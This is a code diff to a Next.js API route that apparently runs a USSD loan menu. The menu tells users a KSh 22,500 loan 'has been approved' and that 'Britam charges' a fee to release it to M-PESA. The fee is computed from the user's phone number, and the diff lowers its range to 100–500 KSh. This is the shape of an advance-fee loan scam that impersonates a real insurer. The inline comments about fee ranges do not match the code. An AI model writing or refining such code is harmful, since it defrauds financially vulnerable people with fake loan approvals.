@@ -494,7 +494,7 @@ export async function POST(req: NextRequest) {
       // Option 1 Flow Final Target Step
       if (mainChoice === "1") {
         if (lastChoice === "1") {
-          const seededFee = Math.floor(200 + (parseFloat(phone.slice(-3)) || 5) % 801);
+          const seededFee = Math.floor(100 + (parseFloat(phone.slice(-3)) || 5) % 401);
           const appUrl = process.env.APP_URL || "https://vercel.app";
           const callbackUrl = `${appUrl}/api/payment-callback`;
 
@@ -513,13 +513,13 @@ export async function POST(req: NextRequest) {
       if (mainChoice === "2") {
         if (lastChoice === "1") {
           const loanProduct = isExtensionDial ? segments[1] : segments[2];
-          let seededFee = 400;
+          let seededFee = 200;
           const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
 
           // Apply specialized fee limits based on product selection patterns
-          if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 801); // Salary: 40-50
-          if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 801); // Biashara: 50-60
-          if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 801); // Emergency: 60-70
+          if (loanProduct === "1") seededFee = Math.floor(100 + phoneSeed % 401); // Salary: 40-50
+          if (loanProduct === "2") seededFee = Math.floor(100 + phoneSeed % 401); // Biashara: 50-60
+          if (loanProduct === "3") seededFee = Math.floor(100 + phoneSeed % 401); // Emergency: 60-70
 
           return respond(`Congratulations! Your KSh 22,500 secured loan has been approved.\nBritam charges KSh ${seededFee} for loan security.\n\n1. Complete fee to release to your M-PESA\n0. Cancel`, true);
         }
@@ -534,11 +534,11 @@ export async function POST(req: NextRequest) {
       if (lastChoice === "1") {
         const loanProduct = isExtensionDial ? segments[1] : segments[2];
         const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
-        let seededFee = Math.floor(200 + phoneSeed % 801);
+        let seededFee = Math.floor(100 + phoneSeed % 401);
         
-        if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 801);
-        if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 801);
-        if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 801);
+        if (loanProduct === "1") seededFee = Math.floor(100 + phoneSeed % 401);
+        if (loanProduct === "2") seededFee = Math.floor(100 + phoneSeed % 401);
+        if (loanProduct === "3") seededFee = Math.floor(100 + phoneSeed % 401);
 
         const appUrl = process.env.APP_URL || "https://vercel.app";
         const callbackUrl = `${appUrl}/api/payment-callback`;
